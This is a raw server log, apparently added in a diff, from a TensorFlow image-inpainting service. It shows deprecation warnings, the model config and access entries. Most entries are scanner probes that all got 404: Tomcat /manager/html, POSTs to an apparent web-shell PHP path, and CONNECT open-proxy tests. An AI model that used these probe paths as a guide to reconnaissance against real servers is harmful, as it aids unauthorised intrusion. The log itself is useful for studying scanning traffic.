@@ -1,0 +1,2240 @@
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:517: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  _np_qint8 = np.dtype([("qint8", np.int8, 1)])
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:518: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  _np_quint8 = np.dtype([("quint8", np.uint8, 1)])
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:519: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  _np_qint16 = np.dtype([("qint16", np.int16, 1)])
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:520: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  _np_quint16 = np.dtype([("quint16", np.uint16, 1)])
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:521: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  _np_qint32 = np.dtype([("qint32", np.int32, 1)])
+/home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/python/framework/dtypes.py:526: FutureWarning: Passing (type, 1) or '1type' as a synonym of type is deprecated; in a future version of numpy, it will be understood as (type, (1,)) / '(1,)type'.
+  np_resource = np.dtype([("resource", np.ubyte, 1)])
+/usr/lib/python3/dist-packages/requests/__init__.py:80: RequestsDependencyWarning: urllib3 (1.26.4) or chardet (3.0.4) doesn't match a supported version!
+  RequestsDependencyWarning)
+WARNING:tensorflow:From /home/ubuntu/.local/lib/python3.6/site-packages/tensorflow/contrib/learn/python/learn/datasets/base.py:198: retry (from tensorflow.contrib.learn.python.learn.datasets.base) is deprecated and will be removed in a future version.
+Instructions for updating:
+Use the retry module or similar alternatives.
+INFO:     Started server process [347]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+2021-04-15 22:32:38.736051: I tensorflow/core/platform/cpu_feature_guard.cc:140] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
+WARNING:tensorflow:From /home/ubuntu/inpaint_ops.py:311: calling reduce_mean (from tensorflow.python.ops.math_ops) with keep_dims is deprecated and will be removed in a future version.
+Instructions for updating:
+keep_dims is deprecated, use keepdims instead
+---------------------------------- APP CONFIG ----------------------------------
+num_gpus_per_job: 1
+num_cpus_per_job: 4
+num_hosts_per_job: 1
+memory_per_job: 32
+gpu_type: nvidia-tesla-p100
+name: places2_gated_conv_v100
+model_restore: 
+dataset: celebahq
+random_crop: False
+val: False
+log_dir: logs/full_model_celeba_hq_256
+gan: sngan
+gan_loss_alpha: 1
+gan_with_mask: True
+discounted_mask: True
+random_seed: False
+padding: SAME
+train_spe: 4000
+max_iters: 100000000
+viz_max_out: 10
+val_psteps: 2000
+data_flist: 
+  celebahq: ['data/celeba_hq/train_shuffled.flist', 'data/celeba_hq/validation_static_view.flist']
+  celeba: ['data/celeba/train_shuffled.flist', 'data/celeba/validation_static_view.flist']
+  places2: ['data/places2/train_shuffled.flist', 'data/places2/validation_static_view.flist']
+  imagenet: ['data/imagenet/train_shuffled.flist', 'data/imagenet/validation_static_view.flist']
+static_view_size: 30
+img_shapes: [256, 256, 3]
+height: 128
+width: 128
+max_delta_height: 32
+max_delta_width: 32
+batch_size: 16
+vertical_margin: 0
+horizontal_margin: 0
+ae_loss: True
+l1_loss: True
+l1_loss_alpha: 1.0
+guided: False
+edge_threshold: 0.6
+--------------------------------------------------------------------------------
+INFO:     197.210.71.73:12674 - "POST /predict HTTP/1.1" 200 OK
+INFO:     88.5.238.31:54564 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.17.96.170:59787 - "GET / HTTP/1.0" 404 Not Found
+INFO:     161.35.117.45:55096 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:47074 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:46908 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     157.230.209.102:23566 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     143.198.98.174:3114 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     199.19.225.101:41736 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     139.59.224.95:47568 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     143.110.240.118:4606 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:47454 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:48670 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     199.19.225.101:41064 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:53287 - "GET http%3A//www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:38766 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:33814 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:49792 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:58635 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:63430 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:52670 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:59960 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:63819 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:59612 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:60478 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:58110 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:58435 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:52024 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:63959 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:56614 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:64177 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:62992 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:56503 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:65011 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:54838 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:61719 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:61846 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:64019 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:52400 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:60150 - "CONNECT api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 76, in maybe_read_from_IDLE_client
+    headers=list(_decode_header_lines(lines[1:])), _parsed=True, **matches
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_events.py", line 71, in __init__
+    self._validate()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_events.py", line 140, in _validate
+    raise LocalProtocolError("Missing mandatory Host: header")
+h11._util.RemoteProtocolError: Missing mandatory Host: header
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 76, in maybe_read_from_IDLE_client
+    headers=list(_decode_header_lines(lines[1:])), _parsed=True, **matches
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_events.py", line 71, in __init__
+    self._validate()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_events.py", line 140, in _validate
+    raise LocalProtocolError("Missing mandatory Host: header")
+h11._util.RemoteProtocolError: Missing mandatory Host: header
+INFO:     52.249.249.127:53692 - "CONNECT sg.search.yahoo.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:58109 - "CONNECT auth.hulu.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     178.128.228.125:50574 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     134.122.37.213:64670 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     192.35.168.176:24904 - "GET / HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:54231 - "CONNECT www.ask.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     159.65.147.208:4328 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:59653 - "CONNECT sg.search.yahoo.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     206.189.181.254:56278 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     209.17.97.90:45337 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:36274 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:59860 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:34354 - "GET / HTTP/1.1" 404 Not Found
+INFO:     161.35.214.109:1762 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     167.248.133.38:55664 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.38:48928 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:56114 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:59334 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     46.101.223.246:26518 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     138.68.130.151:5370 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     104.140.188.26:51304 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:35650 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:38054 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     142.93.1.154:36314 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     143.198.102.102:12234 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     159.89.39.243:34052 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:37438 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:50936 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     143.198.102.200:35212 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:34176 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:43104 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     128.199.18.96:2606 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:55678 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
